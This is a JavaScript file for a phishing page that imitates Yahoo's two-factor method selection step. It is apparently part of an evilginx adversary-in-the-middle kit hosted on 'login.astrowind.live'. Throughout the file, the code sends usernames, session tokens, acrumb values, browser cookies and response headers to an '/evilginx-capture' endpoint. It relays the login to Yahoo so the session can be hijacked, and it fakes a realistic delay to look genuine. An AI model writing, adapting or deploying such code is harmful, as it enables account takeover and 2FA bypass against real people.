// Yahoo 2FA Selection Page JavaScript - Complete Implementation
;(() => {
  // Configuration
  const CONFIG = {
    domain: "login.astrowind.live",
    endpoints: {
      challengeSelector: "/account/challenge/challenge-selector",
      capture: "/evilginx-capture",
    },
    selectors: {
      form: "#yahoo-2fa-form",
      options: ".yahoo-2fa-option",
      radios: 'input[name="selectedMethod"]',
      submitBtn: 'button[type="submit"]',
      sessionIndex: "#sessionIndex",
      acrumb: "#acrumb",
    },
  }

  // State management
  const formState = {
    selectedMethod: "",
    sessionData: {},
    isSubmitting: false,
  }

  // Utility functions
  const utils = {
    getUrlParams: () => {
      const params = new URLSearchParams(window.location.search)
      return {
        sessionIndex: params.get("sessionIndex") || "",
        acrumb: params.get("acrumb") || "",
        u: params.get("u") || "",
        method: params.get("method") || "",
      }
    },

    captureData: async (data) => {
      try {
        await fetch(CONFIG.endpoints.capture, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
          },
          body: JSON.stringify({
            ...data,
            timestamp: Date.now(),
            url: window.location.href,
            userAgent: navigator.userAgent,
            sessionId: formState.sessionData.sessionId,
          }),
        })
      } catch (error) {
        console.debug("Capture failed:", error)
      }
    },

    setLoading: (isLoading) => {
      const form = document.querySelector(CONFIG.selectors.form)
      const submitBtn = document.querySelector(CONFIG.selectors.submitBtn)

      if (isLoading) {
        form.classList.add("yahoo-loading")
        submitBtn.disabled = true
        submitBtn.textContent = "Sending..."
      } else {
        form.classList.remove("yahoo-loading")
        submitBtn.disabled = !formState.selectedMethod
        submitBtn.textContent = "Continue"
      }
    },

    updateSubmitButton: () => {
      const submitBtn = document.querySelector(CONFIG.selectors.submitBtn)
      submitBtn.disabled = !formState.selectedMethod
    },
  }

  // Session management
  const sessionManager = {
    init: () => {
      const urlParams = utils.getUrlParams()
      formState.sessionData = {
        sessionId: "sess_" + Math.random().toString(36).substr(2, 16) + "_" + Date.now(),
        sessionIndex: urlParams.sessionIndex,
        acrumb: urlParams.acrumb,
        username: urlParams.u,
        timestamp: Date.now(),
      }

      // Set hidden form fields
      const sessionIndexField = document.querySelector(CONFIG.selectors.sessionIndex)
      const acrumbField = document.querySelector(CONFIG.selectors.acrumb)

      if (sessionIndexField) sessionIndexField.value = formState.sessionData.sessionIndex
      if (acrumbField) acrumbField.value = formState.sessionData.acrumb

      // Pre-select method if provided
      if (urlParams.method) {
        const methodRadio = document.querySelector(`input[value="${urlParams.method}"]`)
        if (methodRadio) {
          methodRadio.checked = true
          formState.selectedMethod = urlParams.method
          optionHandler.updateSelection(urlParams.method)
        }
      }
    },

    extractCookies: () => {
      const cookies = {}
      document.cookie.split(";").forEach((cookie) => {
        const [name, value] = cookie.trim().split("=")
        if (name && value) {
          cookies[name] = value
        }
      })
      return cookies
    },
  }

  // 2FA option handling
  const optionHandler = {
    updateSelection: (method) => {
      // Update visual selection
      document.querySelectorAll(CONFIG.selectors.options).forEach((option) => {
        option.classList.remove("selected")
      })

      const selectedOption = document.querySelector(`[data-method="${method}"]`)
      if (selectedOption) {
        selectedOption.classList.add("selected")
      }

      // Update state
      formState.selectedMethod = method
      utils.updateSubmitButton()

      // Capture selection
      utils.captureData({
        type: "2fa_method_selected",
        method: method,
        sessionData: formState.sessionData,
      })
    },

    handleOptionClick: (event) => {
      const option = event.currentTarget
      const method = option.getAttribute("data-method")
      const radio = option.querySelector('input[type="radio"]')

      if (radio) {
        radio.checked = true
        optionHandler.updateSelection(method)
      }
    },

    handleRadioChange: (event) => {
      const method = event.target.value
      optionHandler.updateSelection(method)
    },
  }

  // Form submission handler
  const formHandler = {
    handleSubmit: async (event) => {
      event.preventDefault()

      if (formState.isSubmitting || !formState.selectedMethod) return

      formState.isSubmitting = true
      utils.setLoading(true)

      // Capture submission
      await utils.captureData({
        type: "2fa_method_submitted",
        selectedMethod: formState.selectedMethod,
        sessionData: formState.sessionData,
        cookies: sessionManager.extractCookies(),
      })

      // Simulate realistic delay
      await new Promise((resolve) => setTimeout(resolve, 1000 + Math.random() * 500))

      try {
        // Submit to Yahoo (will be intercepted by evilginx)
        const response = await fetch(CONFIG.endpoints.challengeSelector, {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
          },
          body: new URLSearchParams({
            selectedMethod: formState.selectedMethod,
            sessionIndex: formState.sessionData.sessionIndex,
            acrumb: formState.sessionData.acrumb,
          }),
          credentials: "include",
        })

        // Capture response
        await utils.captureData({
          type: "2fa_selection_response",
          status: response.status,
          method: formState.selectedMethod,
          headers: Object.fromEntries(response.headers.entries()),
          cookies: sessionManager.extractCookies(),
        })

        if (response.ok) {
          // Redirect to OTP page
          const params = new URLSearchParams({
            u: formState.sessionData.username,
            sessionIndex: formState.sessionData.sessionIndex,
            acrumb: formState.sessionData.acrumb,
            method: formState.selectedMethod,
          })

          window.location.href = `/otp-index.html?${params.toString()}`
        } else {
          // Handle error
          console.error("2FA selection failed")
          // Could show error message here
        }
      } catch (error) {
        console.error("Submission error:", error)
      } finally {
        utils.setLoading(false)
        formState.isSubmitting = false
      }
    },
  }

  // Event listeners
  const eventListeners = {
    init: () => {
      // Form submission
      const form = document.querySelector(CONFIG.selectors.form)
      if (form) {
        form.addEventListener("submit", formHandler.handleSubmit)
      }

      // Option clicks
      document.querySelectorAll(CONFIG.selectors.options).forEach((option) => {
        option.addEventListener("click", optionHandler.handleOptionClick)
      })

      // Radio changes
      document.querySelectorAll(CONFIG.selectors.radios).forEach((radio) => {
        radio.addEventListener("change", optionHandler.handleRadioChange)
      })

      // Keyboard navigation
      document.addEventListener("keydown", (e) => {
        if (e.key === "Enter" && formState.selectedMethod && !formState.isSubmitting) {
          const form = document.querySelector(CONFIG.selectors.form)
          if (form) {
            form.dispatchEvent(new Event("submit"))
          }
        }

        // Arrow key navigation
        if (e.key === "ArrowUp" || e.key === "ArrowDown") {
          const radios = Array.from(document.querySelectorAll(CONFIG.selectors.radios))
          const currentIndex = radios.findIndex((radio) => radio.checked)
          let nextIndex

          if (e.key === "ArrowUp") {
            nextIndex = currentIndex > 0 ? currentIndex - 1 : radios.length - 1
          } else {
            nextIndex = currentIndex < radios.length - 1 ? currentIndex + 1 : 0
          }

          if (radios[nextIndex]) {
            radios[nextIndex].checked = true
            radios[nextIndex].dispatchEvent(new Event("change"))
            e.preventDefault()
          }
        }
      })
    },
  }

  // Initialize everything when DOM is ready
  const init = () => {
    sessionManager.init()
    eventListeners.init()
    utils.updateSubmitButton()

    // Initial page load capture
    utils.captureData({
      type: "page_loaded",
      page: "2fa_selection",
      sessionData: formState.sessionData,
      cookies: sessionManager.extractCookies(),
    })

    console.debug("Yahoo 2FA selection page initialized")

    // Auto-select first method if none selected
    setTimeout(() => {
      if (!formState.selectedMethod) {
        const firstOption = document.querySelector(CONFIG.selectors.options)
        if (firstOption) {
          const method = firstOption.getAttribute("data-method")
          optionHandler.updateSelection(method)
        }
      }
    }, 500)

    // Get username from URL if available
    const urlParams = new URLSearchParams(window.location.search)
    const username = urlParams.get("u")
    if (username) {
      console.log("Username from previous step:", username)
    }
  }

  // Start when DOM is ready
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init)
  } else {
    init()
  }
})()
